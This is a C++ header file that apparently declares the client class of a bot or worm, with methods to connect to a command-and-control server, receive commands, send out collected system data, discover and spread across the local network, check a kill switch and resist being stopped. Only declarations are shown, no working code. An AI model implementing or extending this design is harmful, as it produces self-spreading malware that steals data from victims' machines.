//
// Created by nn5h on 7/23/19.
//

#ifndef UNDETECTED_PAWN_H
#define UNDETECTED_PAWN_H

#include "CollectSystemData.h"
#include "shared/NetworkOperations.h"
#include "shared/Helper.h"
#include "shared/PRNG.h"


class Pawn {

public:
    SystemDataCollector sdc;
    PRNG gen;
    std::string CC;
    std::vector<std::string> LAN;

    Pawn();
    ~Pawn();

    bool sendMySelfData();
    bool spread();
    bool checkSWKill();
    bool sendData2IP();
    std::string getCC();
    std::string getCommand();
    std::vector<std::string> discoverLAN();
    void doWork();
    void connect2CC();
    void preventKill();
};


#endif //UNDETECTED_PAWN_H
